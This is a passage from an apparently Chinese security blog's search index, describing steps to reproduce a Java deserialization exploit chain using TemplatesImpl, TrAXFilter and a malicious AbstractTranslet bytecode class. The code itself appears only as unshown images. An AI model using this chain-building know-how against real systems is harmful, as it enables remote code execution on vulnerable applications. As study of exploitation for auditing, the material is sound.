title="image-20241230174043718"><p>bytecodes不为空，同时对于_tfactory需要存在调用getExternalExtensionsMap的时候不返回空<img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230174253717.png" class="" title="image-20241230174253717"></p><p>因为他是TransformerFactoryImpl类，给他赋一个即可</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230174549341.png" class="" title="image-20241230174549341"><p>对于TrAXFilter的赋值</p><p>需要保证以下调用链的正常</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230173420723.png" class="" title="image-20241230173420723"><p>写一个反射修改属性的函数</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230173342663.png" class="" title="image-20241230173342663"><p>构造合法的恶意类</p><p>首先需要继承AbstractTranslet</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230173556313.png" class="" title="image-20241230173556313"><p>注意name和tfactory</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230173406262.png" class="" title="image-20241230173406262"><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>链子剩余的部分和cc1 cc6相同，主要是会写恶意字节码类</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
